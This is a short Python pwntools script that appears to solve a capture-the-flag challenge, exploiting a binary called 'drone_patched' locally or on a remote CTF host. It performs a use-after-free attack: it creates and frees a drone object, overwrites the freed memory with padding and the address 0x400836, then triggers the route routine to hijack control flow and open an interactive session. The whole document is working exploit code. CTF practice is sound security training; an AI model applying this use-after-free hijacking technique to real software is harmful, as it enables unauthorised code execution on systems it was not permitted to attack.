#!/usr/bin/env python3

from pwn import *

exe = ELF("./drone_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("uap.ctf.intigriti.io", 1340)

    return r


def main():
    r = conn()
    input()
    # good luck pwning :)
    # Create drone
    r.sendline(b'1')
    pause()
    # Retire Drone
    r.sendline(b'2')
    r.sendline(b'1')
    r.recvline()
    pause()
    # Edit data in freed drone
    r.sendline(b'4')
    r.sendline(b'A'* 16 + p64(0x400836))
    pause()
    # Start its route to trigger
    r.sendline(b'3')
    r.sendline(b'1')
    pause()
    r.interactive()


if __name__ == "__main__":
    main()
